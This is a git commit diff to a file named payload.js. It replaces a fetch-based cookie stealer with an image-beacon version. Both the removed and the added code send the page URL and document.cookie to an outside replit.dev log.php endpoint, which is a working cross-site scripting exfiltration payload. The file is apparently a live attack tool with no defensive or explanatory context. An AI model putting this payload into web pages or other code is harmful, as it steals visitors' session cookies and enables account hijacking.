416e30321a3b5c0f4f8d4ba51558d71da8b78c9f
JPD-12 <123920978+JPD-12@users.noreply.github.com>
2025-05-29 22:20:12 +0400

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,6 +1,2 @@
-fetch("https://82baaa40-4287-4080-8659-5764961ba3aa-00-1wyczbued8hx2.pike.replit.dev/log.php", {
-  method: "POST",
-  body: "URL: " + window.location.href + " | Cookie: " + document.cookie
-})
-.then(() => console.log("Fetch succeeded"))
-.catch(e => console.error("Fetch failed:", e));
+new Image().src = "https://82baaa40-4287-4080-8659-5764961ba3aa-00-1wyczbued8hx2.pike.replit.dev/log.php?data=" + 
+  encodeURIComponent("URL: " + location.href + " | Cookie: " + document.cookie);
